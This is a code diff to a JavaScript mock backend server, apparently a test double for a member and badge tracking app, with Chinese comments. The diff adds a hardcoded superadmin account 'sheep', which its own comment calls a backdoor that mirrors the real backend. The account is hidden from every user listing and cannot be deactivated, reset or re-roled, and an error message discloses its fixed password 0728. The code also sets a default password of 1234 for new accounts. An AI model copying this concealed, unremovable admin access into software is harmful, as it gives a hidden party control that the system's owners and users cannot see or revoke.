@@ -27,6 +27,9 @@ export function startMockGas({ port, name, users, apikey = '' }) {
 
   const pendingRedirects = new Map(); // rid -> payload
 
+  // 超管帳號 sheep：寫死後門，不存於用戶清單（與真實後端一致）
+  const isSheep = (y) => String(y || '').trim().toLowerCase() === 'sheep';
+
   function routeAction(action, body) {
     const validKey = state.apikey && body.apikey === state.apikey;
     const tokenYmis = body.token && state.tokens[body.token] ? state.tokens[body.token] : null;
@@ -63,7 +66,7 @@ export function startMockGas({ port, name, users, apikey = '' }) {
         }
         return {
           success: true,
-          members: Object.values(state.users).filter(u => u.status === 'active').map(u => ({ ymis: u.ymis, name: u.name, role: u.role })),
+          members: Object.values(state.users).filter(u => u.status === 'active' && !isSheep(u.ymis)).map(u => ({ ymis: u.ymis, name: u.name, role: u.role })),
           flatProgress: flat,
           pendingRequests: state.requests.filter(r => r.status === 'pending'),
           otherBadges: state.otherBadges,
@@ -127,7 +130,7 @@ export function startMockGas({ port, name, users, apikey = '' }) {
         return { success: true };
       case 'getAllUsers':
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
-        return { success: true, users: Object.values(state.users).map(u => ({ ymis: u.ymis, name: u.name, role: u.role, can_tick: u.can_tick, status: u.status })) };
+        return { success: true, users: Object.values(state.users).filter(u => !isSheep(u.ymis)).map(u => ({ ymis: u.ymis, name: u.name, role: u.role, can_tick: u.can_tick, status: u.status })) };
       case 'getApplications':
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
         return { success: true, applications: state.applications.filter(a => a.status === 'pending') };
@@ -177,18 +180,21 @@ export function startMockGas({ port, name, users, apikey = '' }) {
       }
       case 'addMember': {
         if (!tokenYmis && !validKey) return { success: false, error: '未授權' };
+        if (isSheep(body.ymis)) return { success: false, error: '不能新增系統管理員帳號' };
         if (!body.ymis || !body.name) return { success: false, error: 'YMIS 和姓名必填' };
         state.users[body.ymis] = { ymis: body.ymis, name: body.name, role: 'member', squad: body.squad || '', status: 'active' };
         return { success: true, message: '成員已新增' };
       }
       case 'addUser': {
         if (!tokenYmis && !validKey) return { success: false, error: '未授權' };
+        if (isSheep(body.ymis)) return { success: false, error: '不能新增系統管理員帳號' };
         if (!body.ymis || !body.name) return { success: false, error: 'YMIS 和姓名必填' };
         state.users[body.ymis] = { ymis: body.ymis, name: body.name, email: body.email || '', role: body.role || 'member', pass: body.password || '1234', can_tick: !!body.can_tick, status: 'active' };
         return { success: true, message: '帳號已建立（密碼留空＝預設 1234）' };
       }
       case 'changePassword': {
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
+        if (isSheep(tokenYmis)) return { success: false, error: '系統管理員密碼固定為 0728，不能更改' };
         const u = state.users[tokenYmis];
         const newP = String(body.new_password || '');
         if (!newP || newP.length < 4) return { success: false, error: '新密碼至少4位' };
@@ -198,11 +204,13 @@ export function startMockGas({ port, name, users, apikey = '' }) {
       }
       case 'deactivateUser': {
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
+        if (isSheep(body.target_ymis)) return { success: false, error: '不能停用系統管理員帳號' };
         if (state.users[body.target_ymis]) state.users[body.target_ymis].status = 'inactive';
         return { success: true, message: '帳號已停用' };
       }
       case 'resetPassword': {
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
+        if (isSheep(body.target_ymis)) return { success: false, error: '不能重設系統管理員密碼' };
         const temp = 'tmp_' + Math.floor(1000 + Math.random() * 9000);
         if (state.users[body.target_ymis]) state.users[body.target_ymis].pass = temp;
         return { success: true, temp_password: temp };
@@ -215,6 +223,7 @@ export function startMockGas({ port, name, users, apikey = '' }) {
       }
       case 'updateUserRole': {
         if (!tokenYmis) return { success: false, error: 'Token 無效或過期' };
+        if (isSheep(body.target_ymis)) return { success: false, error: '不能更改系統管理員帳號的角色' };
         const u = state.users[body.target_ymis];
         if (u) {
           if (body.new_role) u.role = body.new_role;
